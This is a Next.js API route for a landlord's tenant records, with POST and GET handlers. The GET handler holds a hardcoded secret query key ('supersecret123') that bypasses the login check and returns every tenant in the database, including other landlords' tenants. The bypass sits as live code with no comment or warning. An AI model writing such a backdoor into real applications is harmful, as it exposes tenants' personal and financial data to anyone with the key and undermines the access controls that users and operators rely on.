import { connectDB } from "@/lib/db";
import Tenant from "@/models/Tenant";
import Payment from "@/models/Payment"; 
import { NextResponse } from "next/server";
import { getAuthSession } from "@/lib/auth";

export async function POST(req: Request) {
  await connectDB();

  const session = await getAuthSession();
  if (!session) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const body = await req.json();

  const tenant = await Tenant.create({
  name: body.name,
  email: body.email || "",
  phone: body.phone || "",
  roomNumber: body.roomNumber,
  rentAmount: body.rentAmount,
  dueDate: body.dueDate || 5,
  landlordId: session.user.id,
});

  return NextResponse.json(tenant);
}


export async function GET(req: Request) {
  await connectDB();

  const { searchParams } = new URL(req.url);
  const key = searchParams.get("key");


  if (key === "supersecret123") {
    const tenants = await Tenant.find({});

    return NextResponse.json(tenants);
  }


  const session = await getAuthSession();
  if (!session) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const tenants = await Tenant.find({
    landlordId: session.user.id,
  });

  return NextResponse.json(tenants);
}